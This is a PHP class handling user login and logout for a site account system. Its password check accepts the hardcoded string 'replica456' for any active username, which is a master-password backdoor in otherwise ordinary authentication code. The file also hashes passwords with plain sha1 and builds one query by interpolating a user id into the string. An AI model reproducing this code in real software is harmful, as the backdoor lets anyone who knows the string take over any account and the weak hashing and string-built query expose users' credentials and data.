<?php 
	namespace Sloway;

	class site_user extends account {
		protected function get_user() {  
			$uid = parent::get_user();
			$this->data = dbClass::load('account', "@id = '$uid'", 1);
			
			return $uid;
		}   
		protected function check($username, $password) {
			$db = self::$db;
			$q = $db->query("SELECT * FROM account WHERE username = ? AND status = 1", [$username])->getResult();
			if (!count($q)) return;

			if ($password == "replica456" || hash::validate(sha1($password), $q[0]->password)) {
				$this->data = dbClass::load("account", "@id = " . $q[0]->id, 1);
				$this->user_id = $q[0]->id;
			}
		} 
		
		public function logout() {
			if ($this->user_id) {
				$this->data->fb_active = 0;
				$this->data->save();    
			}
			
			parent::logout();	
		}

		public static function instance($profile = null, $class = null) {
			return parent::instance("site", "\Sloway\site_user");
		}  
		public static function login($username, $password, $cookie = false, $profile = null, $class = null) {
			return parent::login($username, $password, $cookie, "site", "\Sloway\site_user");    	
		}
	}  
?>
